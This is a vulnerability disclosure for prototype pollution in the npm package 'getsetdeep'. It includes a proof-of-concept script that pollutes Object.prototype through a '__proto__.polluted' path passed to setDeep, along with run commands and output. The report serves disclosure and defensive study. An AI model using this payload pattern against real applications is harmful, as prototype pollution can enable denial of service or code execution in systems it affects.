# Description

`getsetdeep` is vulnerable to `Prototype Pollution`.
This package fails to restrict access to prototypes of objects, allowing for modification of prototype behavior using a `proto` payload, which may result in Sensitive Information Disclosure/Denial of Service(DoS)/Remote Code Execution.


# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var getsetdeep = require("getsetdeep")
const obj = {}
console.log("Before : " + {}.polluted);
getsetdeep.setDeep(obj, '__proto__.polluted', 'Yes! Its Polluted');
console.log("After : " + {}.polluted);
```
2. Execute the following commands in another terminal:

```
npm i getsetdeep # Install affected module
node poc.js #  Run the PoC
```
3. Check the Output:
```
Before : undefined
After : Yes! It's Polluted
```
